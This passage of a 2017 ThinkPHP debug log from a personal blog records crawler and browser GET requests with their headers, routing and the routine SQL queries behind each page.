  'user-agent' => 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
  'from' => 'support@search.yandex.ru',
  'accept-encoding' => 'gzip,deflate',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '48',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Artical->detail[ /yjdata/www/hhqblog/application/index/controller/Artical.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/artical/detail.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'article',
  5 => 'allpage',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000283s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000840s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000760s ]
[ sql ] [ SQL ] SELECT `a`.*,`ca`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ca` ON `a`.`cate_id`=`ca`.`id` WHERE  `a`.`id` = 48 LIMIT 1 [ RunTime:0.000307s ]

---------------------------------------------------------------
[ 2017-08-10T17:43:39+08:00 ] 172.17.180.47 5.255.250.29 GET /ar/45.html
[ log ] www.hhqblog.com/ar/45.html [运行时间：0.030775s][吞吐率：32.49req/s] [内存消耗：4,375.03kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'Artical',
    2 => 'detail',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'Keep-Alive',
  'user-agent' => 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
  'from' => 'support@search.yandex.ru',
  'accept-encoding' => 'gzip,deflate',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '45',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Artical->detail[ /yjdata/www/hhqblog/application/index/controller/Artical.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/artical/detail.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'article',
  5 => 'allpage',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000284s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000836s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000686s ]
[ sql ] [ SQL ] SELECT `a`.*,`ca`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ca` ON `a`.`cate_id`=`ca`.`id` WHERE  `a`.`id` = 45 LIMIT 1 [ RunTime:0.000323s ]

---------------------------------------------------------------
[ 2017-08-10T18:04:16+08:00 ] 172.17.180.47 220.181.108.184 GET /
[ log ] www.hhqblog.com/ [运行时间：0.035067s][吞吐率：28.52req/s] [内存消耗：5,415.55kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
  'accept-language' => 'zh-cn,zh-tw',
  'if-none-match' => '"@NULL@"',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000304s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000850s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `is_tui` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000920s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000408s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000511s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000338s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000360s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000664s ]

---------------------------------------------------------------
[ 2017-08-10T19:02:57+08:00 ] 172.17.180.47 140.205.205.5 GET /ar/32
[ log ] www.hhqblog.com/ar/32 [运行时间：0.036111s][吞吐率：27.69req/s] [内存消耗：4,239.83kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'Artical',
    2 => 'detail',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'accept-language' => 'en',
  'accept-encoding' => 'gzip,deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '32',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Artical->detail[ /yjdata/www/hhqblog/application/index/controller/Artical.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/artical/detail.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'article',
  5 => 'allpage',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000367s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000979s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000879s ]
[ sql ] [ SQL ] SELECT `a`.*,`ca`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ca` ON `a`.`cate_id`=`ca`.`id` WHERE  `a`.`id` = 32 LIMIT 1 [ RunTime:0.000333s ]

---------------------------------------------------------------
[ 2017-08-10T19:49:34+08:00 ] 172.17.180.47 169.54.233.116 GET /
[ log ] hhqblog.com/ [运行时间：0.034478s][吞吐率：29.00req/s] [内存消耗：5,400.52kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000311s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000792s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `is_tui` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000918s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000402s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000485s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 1 ORDER BY id desc LIMIT 6 [ RunTime:0.000326s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000331s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000337s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000657s ]

---------------------------------------------------------------
[ 2017-08-10T20:02:00+08:00 ] 172.17.180.47 169.54.233.116 GET /
[ log ] hhqblog.com/ [运行时间：0.032172s][吞吐率：31.08req/s] [内存消耗：5,437.09kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000305s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000822s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000715s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000415s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000395s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000764s ]

---------------------------------------------------------------
[ 2017-08-10T21:09:27+08:00 ] 172.17.180.47 117.71.34.139 GET /
[ log ] hhqblog.com/ [运行时间：0.035801s][吞吐率：27.93req/s] [内存消耗：5,401.63kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-language' => 'zh-cn,zh;q=0.5',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000325s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000835s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `is_tui` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.001013s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000467s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000493s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 1 ORDER BY id desc LIMIT 6 [ RunTime:0.000347s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000400s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000394s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000696s ]

---------------------------------------------------------------
[ 2017-08-10T22:38:00+08:00 ] 172.17.180.47 140.205.205.4 GET /ar/32
[ log ] www.hhqblog.com/ar/32 [运行时间：0.031620s][吞吐率：31.63req/s] [内存消耗：4,218.59kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'Artical',
    2 => 'detail',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'accept-language' => 'en',
  'accept-encoding' => 'gzip,deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '32',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Artical->detail[ /yjdata/www/hhqblog/application/index/controller/Artical.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/artical/detail.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'article',
  5 => 'allpage',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000273s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000790s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `is_tui` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000924s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000407s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000480s ]
[ sql ] [ SQL ] SELECT `a`.*,`ca`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ca` ON `a`.`cate_id`=`ca`.`id` WHERE  `a`.`id` = 32 LIMIT 1 [ RunTime:0.000243s ]

---------------------------------------------------------------
[ 2017-08-10T22:59:38+08:00 ] 172.17.180.47 5.255.250.29 GET /
[ log ] hhqblog.com/ [运行时间：0.034259s][吞吐率：29.19req/s] [内存消耗：5,424.69kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'Keep-Alive',
  'user-agent' => 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
  'from' => 'support@search.yandex.ru',
  'accept-encoding' => 'gzip,deflate',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000307s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000809s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000700s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 1 ORDER BY id desc LIMIT 6 [ RunTime:0.000377s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000340s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000347s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000714s ]

---------------------------------------------------------------
[ 2017-08-10T22:59:44+08:00 ] 172.17.180.47 202.108.211.56 GET /
[ log ] www.hhqblog.com/ [运行时间：0.033437s][吞吐率：29.91req/s] [内存消耗：5,438.64kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1042.0 Safari/535.21',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
  'cache-control' => 'no-cache',
  'pragma' => 'no-cache',
  'upgrade-insecure-requests' => '1',
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000296s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000828s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000739s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000420s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000369s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000746s ]

---------------------------------------------------------------
[ 2017-08-10T23:51:31+08:00 ] 172.17.180.47 140.205.205.5 GET /ar/32
[ log ] www.hhqblog.com/ar/32 [运行时间：0.031882s][吞吐率：31.37req/s] [内存消耗：4,218.42kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'Artical',
    2 => 'detail',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'accept-language' => 'en',
  'accept-encoding' => 'gzip,deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '32',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Artical->detail[ /yjdata/www/hhqblog/application/index/controller/Artical.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/artical/detail.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'article',
  5 => 'allpage',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000303s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000809s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `is_tui` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000926s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000404s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000478s ]
[ sql ] [ SQL ] SELECT `a`.*,`ca`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ca` ON `a`.`cate_id`=`ca`.`id` WHERE  `a`.`id` = 32 LIMIT 1 [ RunTime:0.000234s ]

---------------------------------------------------------------
